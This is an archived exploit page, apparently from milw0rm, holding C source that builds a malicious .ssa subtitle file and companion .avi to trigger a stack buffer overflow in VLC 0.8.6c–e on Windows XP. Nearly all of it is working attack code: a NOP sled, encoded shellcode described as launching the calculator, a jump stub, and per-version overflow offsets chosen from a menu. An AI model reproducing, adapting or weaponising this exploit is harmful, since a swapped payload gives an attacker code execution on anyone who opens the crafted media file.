<html><head><title>VLC <= 0.8.6e Subtitle Parsing Local Buffer Overflow Exploit</title></head><pre>/*
VLC &lt;=0.8.6.e
Subtitle parsing local buffer overflow exploit
Creadit to cuongmx@gmail.com vs Look2Me @
Tested on windows XP Pro SP2

*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

char ssa_header[]=
&quot;[Script Info]\r\n&quot;
&quot;Title: VLC &lt;= 0.8.6c,e buffer-overflow\r\n&quot;
&quot;ScriptType: v4.00\r\n&quot;
&quot;Collisions: Normal\r\n&quot;
&quot;[V4 Styles]\r\n&quot;
&quot;[Events]\r\n&quot;
&quot;Dialogue:&quot;;

// execute calculator from Meta
char shellcode[] =
&quot;\x31\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x3d&quot;
&quot;\xba\xb1\xd9\x83\xeb\xfc\xe2\xf4\xc1\x52\xf5\xd9\x3d\xba\x3a\x9c&quot;
&quot;\x01\x31\xcd\xdc\x45\xbb\x5e\x52\x72\xa2\x3a\x86\x1d\xbb\x5a\x90&quot;
&quot;\xb6\x8e\x3a\xd8\xd3\x8b\x71\x40\x91\x3e\x71\xad\x3a\x7b\x7b\xd4&quot;
&quot;\x3c\x78\x5a\x2d\x06\xee\x95\xdd\x48\x5f\x3a\x86\x19\xbb\x5a\xbf&quot;
&quot;\xb6\xb6\xfa\x52\x62\xa6\xb0\x32\xb6\xa6\x3a\xd8\xd6\x33\xed\xfd&quot;
&quot;\x39\x79\x80\x19\x59\x31\xf1\xe9\xb8\x7a\xc9\xd5\xb6\xfa\xbd\x52&quot;
&quot;\x4d\xa6\x1c\x52\x55\xb2\x5a\xd0\xb6\x3a\x01\xd9\x3d\xba\x3a\xb1&quot;
&quot;\x01\xe5\x80\x2f\x5d\xec\x38\x21\xbe\x7a\xca\x89\x55\xc4\x69\x3b&quot;
&quot;\x4e\xd2\x29\x27\xb7\xb4\xe6\x26\xda\xd9\xd0\xb5\x5e\xba\xb1\xd9&quot;;

char szJMP[]=
&quot;\x90\x90\xe9\x38\xff\xff\xff\xeb\xf9\x90\x90\x0b\x0b\x38\x00&quot;;

char szAVI[]=
&quot;\x52\x49\x46\x46\xC\x0\x0\x0\x41\x56\x49\x20\x4C\x49\x53\x54\x00\x00\x00&quot;;

main()
{
    int i,j,k;
    printf(&quot;Give me your VLC version:\r\n&quot;);
    printf(&quot;1&gt; version 8.06.c\r\n&quot;);
    printf(&quot;2&gt; version 8.06.d\r\n&quot;);
    printf(&quot;3&gt; version 8.06.e\r\nChose:&quot;);
    j=getchar();
    switch(j)
    {
        case '1': k=165254;break;
        case '2': printf(&quot;\r\nI haven't got this version!\r\n Good Luck :-)&quot;);
                  getchar();
                  return 0;break;
        case '3': k=165286;break;
    }
    k=k-sizeof(shellcode);
    printf(&quot;\r\n[+] Creating .ssa file ...&quot;);
    FILE*    f;
    char    szBuffer[170000];
    char    szBuffer2[200];

    strcpy(szBuffer,ssa_header);    // header of ssa
    
    memset((szBuffer+sizeof(ssa_header)-1),'\x90',k);
    szBuffer[k+sizeof(ssa_header)]='\x00';
    strcpy(szBuffer2,shellcode);
    strcat(szBuffer2,szJMP);
    strcat(szBuffer,szBuffer2);
    
    f=fopen(&quot;Bof-VLC.ssa&quot;,&quot;wb&quot;);
    if(f==NULL)
    {
        printf(&quot;Can't create file&quot;);
        exit;
    }
    fwrite(szBuffer,1,strlen(szBuffer),f);  // write header
    fclose(f);
    printf(&quot;\r\n[+] .ssa file successfully create!&quot;);
	
	printf(&quot;\r\n[+] Creation .avi file ...&quot;);
    f=fopen(&quot;Bof-VLC.avi&quot;,&quot;wb&quot;);
    if(f==NULL)
    {
        printf(&quot;Can't create file&quot;);
        exit;
    }
    fwrite(szAVI,1,sizeof(szAVI),f);  // write header
    fclose(f);	
    printf(&quot;\r\n[+] .avi file successfully create!&quot;);
    getchar();
}

// milw0rm.com [2008-03-14]</pre></html>